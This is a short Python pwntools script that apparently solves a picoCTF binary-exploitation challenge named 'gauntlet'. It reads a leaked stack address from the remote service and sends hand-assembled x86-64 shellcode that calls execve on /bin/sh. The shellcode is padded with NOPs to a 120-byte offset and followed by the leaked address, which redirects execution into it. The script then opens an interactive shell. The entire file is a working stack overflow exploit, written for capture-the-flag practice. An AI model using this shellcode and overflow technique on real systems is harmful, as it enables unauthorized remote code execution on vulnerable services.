from pwn import *

r = remote("wily-courier.picoctf.net",53609)
# r = process("/mnt/c/Users/PC/Downloads/gauntlet")

elf = ELF("/mnt/c/Users/PC/Downloads/gauntlet")

context.arch = elf.arch
context.binary = elf
context.log_level = 'debug'

local_78_addr = int(r.recvline().strip() , 16)
print(local_78_addr)

r.sendline(b"a")
r.recvline()

offset = 120

# shellcode = asm(shellcode.sh())
shellcode = asm("""
    /* rsi , rdx xor to zero */
    xor rsi, rsi
    xor rdx, rdx

    /* ; prepare "/bin/sh" string */
    mov rax, 0x68732f6e69622f2f
    shr rax, 8
    push rax
    mov rdi, rsp

    /* ; set syscall and trigger */
    push 59
    pop rax
    syscall
""")

payload = shellcode + b"\x90"*(offset-len(shellcode)) + p64(local_78_addr)

r.sendline(payload)

r.interactive()
